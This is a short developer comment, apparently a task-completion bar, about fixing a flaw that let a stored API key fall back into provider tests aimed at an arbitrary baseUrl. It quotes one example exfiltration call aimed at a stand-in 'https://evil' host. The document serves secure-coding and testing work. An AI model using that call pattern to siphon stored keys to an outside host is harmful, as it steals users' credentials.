$comment: Completion bar for #21: providers:test / fetchModels accepted a draft with an id/presetId and ANY baseUrl, and draftKey fell back to the saved/env key — so a compromised renderer could call test({id:'openai', baseUrl:'https://evil'}) with a blank key and the stored key would be sent there, breaking the write-only-keys guarantee. Fix: reuse a stored key only when the draft baseUrl equals the saved baseUrl (or the preset default); otherwise require re-entry. Criterion 1 fails before the change (trustedBaseUrl did not exist); 2 covers the new 'changed baseUrl never receives the stored key' test in test:providers; 3-5 guard typecheck, build, and the rest of the suite.
